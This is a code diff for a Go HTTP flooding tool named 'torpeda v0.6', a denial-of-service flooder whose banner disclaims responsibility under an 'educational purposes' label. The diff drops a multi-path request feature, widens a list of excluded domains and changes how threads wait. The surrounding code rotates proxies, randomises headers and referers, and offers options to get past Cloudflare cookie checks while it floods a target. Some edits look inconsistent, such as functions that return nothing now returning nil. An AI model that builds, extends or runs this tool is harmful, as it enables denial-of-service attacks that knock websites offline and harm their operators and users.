@@ -93,17 +93,15 @@ var (
 	refererURL       string
 	customCookie     string
 	customUserAgent  string
-	multipathValue   string
-    paths            = []string{""}
-    currentPathIndex = 0 
 
 	connectionFlow   = uint32(15663105)
 	statusMutex      sync.Mutex
 	statusMap        = make(map[int]int)
 	customHeaders    = make(map[string]string)
 	licenseVerified  = false
+ wg sync.WaitGroup
 
-	blockedDomains = []string{".gov", ".byf", ".ua"}
+	blockedDomains = []string{".gov", ".by", ".ua", ".edu", ".int", ".mil"}
 
 	randomReferers = []string{
 		"https://www.google.com",
@@ -179,11 +177,10 @@ func isBlockedDomain(target string) bool {
 }
 
 func main() {
-	parseMultipath()
 	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
 	if len(os.Args) < 7 {
 	fmt.Print("\033[H\033[2J")
-	fmt.Println(`	[flooder - golang] torpeda v0.6 // Updated: 13.11.2024 // Made with love :D
+	fmt.Println(`	[flooder - golang] torpeda v0.6 // Updated: 15.11.2024 // Made with love :D
 	Developers to method: mitigations aka @rapidreset
 	WARNING: The method was done for educational purposes, all responsibility is on you!
 	Annoucement: torpeda channel (in bio) / @rapidreset
@@ -205,7 +202,6 @@ func main() {
 	--ua "<string>" - For custom useragent ex: "curl/4.0"
 	--cf - For sites who has protection based on check cf_clearence cookies
 	--http1 - For sites who have only http/1.1 
-	--multipath "/login@/register@" - max 5 paths like "/page1@/page2@/page3@/page4@/page5"
 	 `)
 	return
 }
@@ -294,11 +290,13 @@ func main() {
 	defer p.Release()
 
 	for i := 0; i < threads; i++ {
+		wg.Add(1)
 		p.Submit(func() {
 			for _, proxy := range proxies {
 				go start(proxy)
 			}
 		})
+		wg.Wait()
 	}
 
 	time.Sleep(time.Duration(duration) * time.Second)
@@ -320,22 +318,6 @@ func detectProxyType(proxy string) string {
 	}
 
 	return "http"
-}
-
-func parseMultipath() {
-    for i := 0; i < len(os.Args); i++ {
-        if os.Args[i] == "--multipath" && i+1 < len(os.Args) {
-            multipathValue = os.Args[i+1]
-            paths = strings.Split(multipathValue, "@")
-            break
-        }
-    }
-}
-
-func getNextPath() string {
-    currentPath := paths[currentPathIndex]
-    currentPathIndex = (currentPathIndex + 1) % len(paths)
-    return currentPath
 }
 
 func parseCustomHeaders(headers string) {
@@ -540,7 +522,6 @@ func randomHeader() http.Header {
 			"priority",
 		}
 	}
-
 	return header
 }
 
@@ -711,13 +692,11 @@ func start(proxy string) {
 			return nil
 		}
 	}
-    reqPath := getNextPath()
-    fullURL := target + reqPath
 
-    req, err := http.NewRequest(reqmethod, fullURL, nil)
+    req, err := http.NewRequest(reqmethod, target, nil)
     if err != nil {
 		updateErrorCounters(err) 
-        return
+        return nil
     }
 
     req.Header = randomHeader()
@@ -729,7 +708,7 @@ func start(proxy string) {
 
     resp, err := client.Do(req)
     if err != nil {
-        return
+        return nil
     }
     defer resp.Body.Close()
 
@@ -742,7 +721,6 @@ func start(proxy string) {
     }
 
     ratePattern := createRatePattern(rps)
-    var wg sync.WaitGroup
 
     for _, interval := range ratePattern {
         ticker := time.NewTicker(interval)
@@ -752,9 +730,6 @@ func start(proxy string) {
         go func() {
             defer wg.Done()
             for range ticker.C {
-				reqPath := getNextPath()
-                req.URL.Path = reqPath
-
                 resp, err := client.Do(req)
 				if err != nil {
 					updateErrorCounters(err)
